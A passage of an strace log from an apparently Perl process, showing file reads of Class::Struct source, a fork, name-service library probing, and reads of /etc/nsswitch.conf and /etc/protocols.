\'$classes{$name}\');\\n\";\n                }\n            }\n            $out .= \"    croak \'Too many args to $name\' if \\@_ > 1;\\n\";\n            $out .= \"    \\@_ ? ($pre\\$r->$elem$sel = shift$pst) : $pre\\$r->$elem$sel$pst;\\n\";\n            $out .= \"  }\\n\";\n        }\n    }\n    $out .= \"}\\n1;\\n\";\n\n    print $out if $print;\n    my $result = eval $out;\n    carp $@ if $@;\n}\n\nsub _usage_error {\n    confess \"struct usage error\";\n}\n\nsub _subclass_error {\n    croak \'struct class cannot be a subclass (@ISA not allowed)\';\n}\n\n1; # for require\n\n\n__END__\n\n=head1 NAME\n\nClass::Struct - declare struct-like datatypes as Perl classes\n\n=head1 SYNOPSIS\n\n    use Class::Struct;\n            # declare struct, based on array:\n    struct( CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ]);\n            # declare struct, based on hash:\n    struct( CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... });\n\n    package CLASS_NAME;\n    use Class::Struct;\n            # declare struct, based on array, implicit class name:\n    struct( ELEMENT_NAME => ELEMENT_TYPE, ... );\n\n    # Declare struct at compile time\n    use Class::Struct CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ];\n    use Class::Struct CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... };\n\n    # declare struct at compile time, based on array, implicit class name:\n    package CLASS_NAME;\n    use Class::Struct ELEMENT_NAME => ELEMENT_TYPE, ... ;\n\n    package Myobj;\n    use Class::Struct;\n            # declare struct with four types of elements:\n    struct( s => \'$\', a => \'@\', h => \'%\', c => \'My_Other_Class\' );\n\n    $obj = new Myobj;               # constructor\n\n                                    # scalar type accessor:\n    $element_value = $obj->s;           # element value\n    $obj->s(\'new value\');               # assign to element\n\n                             ", 4096) = 4096
8458  07:23:31.529928 _llseek(10, 6916, [6916], SEEK_SET) = 0
8458  07:23:31.529955 _llseek(10, 0, [6916], SEEK_CUR) = 0
8458  07:23:31.529968 close(10)         = 0
8458  07:23:31.530182 _llseek(8, 1334, [1334], SEEK_SET) = 0
8458  07:23:31.530197 _llseek(8, 0, [1334], SEEK_CUR) = 0
8458  07:23:31.530208 close(8)          = 0
8458  07:23:31.530870 brk(0x82ff000)    = 0x82ff000
8458  07:23:31.531117 _llseek(6, 2689, [2689], SEEK_SET) = 0
8458  07:23:31.531138 _llseek(6, 0, [2689], SEEK_CUR) = 0
8458  07:23:31.531152 close(6)          = 0
8458  07:23:31.531342 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d42908) = 8459
8459  07:23:31.542492 getppid()         = 8458
8459  07:23:31.542969 open("/etc/nsswitch.conf", O_RDONLY) = 6
8459  07:23:31.542995 fstat64(6, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
8459  07:23:31.543015 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f08000
8459  07:23:31.543030 read(6, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
8459  07:23:31.543082 read(6, "", 4096) = 0
8459  07:23:31.543092 close(6)          = 0
8459  07:23:31.543102 munmap(0xb7f08000, 4096) = 0
8459  07:23:31.543129 open("/etc/ld.so.cache", O_RDONLY) = 6
8459  07:23:31.543143 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
8459  07:23:31.543160 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7d0f000
8459  07:23:31.543172 close(6)          = 0
8459  07:23:31.543183 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8459  07:23:31.543201 open("/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.543215 stat64("/lib/tls/i686/sse2/cmov", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.543230 open("/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.543244 stat64("/lib/tls/i686/sse2", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.543256 open("/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.543269 stat64("/lib/tls/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
8459  07:23:31.543287 open("/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.543299 stat64("/lib/tls/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
8459  07:23:31.543316 open("/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.543329 stat64("/lib/tls/sse2/cmov", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.543340 open("/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.543352 stat64("/lib/tls/sse2", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.543363 open("/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.543375 stat64("/lib/tls/cmov", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.543386 open("/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.543417 stat64("/lib/tls", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
8459  07:23:31.543435 open("/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.543447 stat64("/lib/i686/sse2/cmov", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.543459 open("/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.543471 stat64("/lib/i686/sse2", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.543482 open("/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.543494 stat64("/lib/i686/cmov", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.543504 open("/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.543516 stat64("/lib/i686", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.543527 open("/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.543539 stat64("/lib/sse2/cmov", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.543550 open("/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.543561 stat64("/lib/sse2", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.543572 open("/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.543584 stat64("/lib/cmov", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.543594 open("/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.543605 stat64("/lib", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
8459  07:23:31.543622 open("/usr/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.543635 stat64("/usr/lib/tls/i686/sse2/cmov", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.543647 open("/usr/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.543660 stat64("/usr/lib/tls/i686/sse2", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.543671 open("/usr/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.543684 stat64("/usr/lib/tls/i686/cmov", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.543695 open("/usr/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.543707 stat64("/usr/lib/tls/i686", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.543719 open("/usr/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.543731 stat64("/usr/lib/tls/sse2/cmov", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.543743 open("/usr/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.543755 stat64("/usr/lib/tls/sse2", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.543766 open("/usr/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.543778 stat64("/usr/lib/tls/cmov", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.543789 open("/usr/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.543801 stat64("/usr/lib/tls", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.543812 open("/usr/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.543825 stat64("/usr/lib/i686/sse2/cmov", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.543837 open("/usr/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.543849 stat64("/usr/lib/i686/sse2", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.543860 open("/usr/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.543873 stat64("/usr/lib/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
8459  07:23:31.543904 open("/usr/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.543917 stat64("/usr/lib/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
8459  07:23:31.543935 open("/usr/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.543947 stat64("/usr/lib/sse2/cmov", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.543958 open("/usr/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.543970 stat64("/usr/lib/sse2", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.543981 open("/usr/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.543993 stat64("/usr/lib/cmov", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.544004 open("/usr/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.544016 stat64("/usr/lib", {st_mode=S_IFDIR|0755, st_size=32768, ...}) = 0
8459  07:23:31.544033 open("/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.544047 stat64("/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.544059 open("/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.544073 stat64("/lib/i486-linux-gnu/tls/i686/sse2", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.544085 open("/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.544098 stat64("/lib/i486-linux-gnu/tls/i686/cmov", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.544111 open("/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.544123 stat64("/lib/i486-linux-gnu/tls/i686", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.544135 open("/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.544148 stat64("/lib/i486-linux-gnu/tls/sse2/cmov", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.544160 open("/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.544173 stat64("/lib/i486-linux-gnu/tls/sse2", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.544185 open("/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.544198 stat64("/lib/i486-linux-gnu/tls/cmov", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.544210 open("/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.544222 stat64("/lib/i486-linux-gnu/tls", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.544234 open("/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.544247 stat64("/lib/i486-linux-gnu/i686/sse2/cmov", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.544259 open("/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.544272 stat64("/lib/i486-linux-gnu/i686/sse2", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.544284 open("/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.544297 stat64("/lib/i486-linux-gnu/i686/cmov", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.544309 open("/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.544322 stat64("/lib/i486-linux-gnu/i686", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.544333 open("/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.544346 stat64("/lib/i486-linux-gnu/sse2/cmov", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.544361 open("/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.544374 stat64("/lib/i486-linux-gnu/sse2", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.544395 open("/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.544436 stat64("/lib/i486-linux-gnu/cmov", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.544448 open("/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.544475 stat64("/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
8459  07:23:31.544493 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.544507 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.544520 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.544533 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.544546 open("/usr/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.544559 stat64("/usr/lib/i486-linux-gnu/tls/i686/cmov", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.544572 open("/usr/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.544585 stat64("/usr/lib/i486-linux-gnu/tls/i686", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.544598 open("/usr/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.544612 stat64("/usr/lib/i486-linux-gnu/tls/sse2/cmov", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.544625 open("/usr/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.544638 stat64("/usr/lib/i486-linux-gnu/tls/sse2", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.544651 open("/usr/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.544663 stat64("/usr/lib/i486-linux-gnu/tls/cmov", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.544676 open("/usr/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.544688 stat64("/usr/lib/i486-linux-gnu/tls", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.544700 open("/usr/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.544714 stat64("/usr/lib/i486-linux-gnu/i686/sse2/cmov", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.544726 open("/usr/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.544740 stat64("/usr/lib/i486-linux-gnu/i686/sse2", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.544752 open("/usr/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.544765 stat64("/usr/lib/i486-linux-gnu/i686/cmov", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.544777 open("/usr/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.544790 stat64("/usr/lib/i486-linux-gnu/i686", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.544802 open("/usr/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.544816 stat64("/usr/lib/i486-linux-gnu/sse2/cmov", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.544828 open("/usr/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.544844 stat64("/usr/lib/i486-linux-gnu/sse2", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.544856 open("/usr/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.544869 stat64("/usr/lib/i486-linux-gnu/cmov", 0xbf9dc67c) = -1 ENOENT (No such file or directory)
8459  07:23:31.544881 open("/usr/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8459  07:23:31.544904 stat64("/usr/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
8459  07:23:31.544924 munmap(0xb7d0f000, 29913) = 0
8459  07:23:31.544945 open("/etc/ld.so.cache", O_RDONLY) = 6
8459  07:23:31.544957 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
8459  07:23:31.544974 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7d0f000
8459  07:23:31.544985 close(6)          = 0
8459  07:23:31.544995 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8459  07:23:31.545010 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 6
8459  07:23:31.545025 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
8459  07:23:31.545116 fstat64(6, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
8459  07:23:31.545138 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7d04000
8459  07:23:31.545150 mmap2(0xb7d0d000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x8) = 0xb7d0d000
8459  07:23:31.545169 close(6)          = 0
8459  07:23:31.545193 munmap(0xb7d0f000, 29913) = 0
8459  07:23:31.545209 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
8459  07:23:31.545225 fcntl64(6, F_GETFD) = 0x1 (flags FD_CLOEXEC)
8459  07:23:31.545241 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
8459  07:23:31.545258 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d16000
8459  07:23:31.545269 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
8459  07:23:31.545471 close(6)          = 0
8459  07:23:31.545482 munmap(0xb7d16000, 4096) = 0
8459  07:23:31.545500 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
8459  07:23:31.545515 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
8459  07:23:31.545531 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d16000
8459  07:23:31.545542 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload 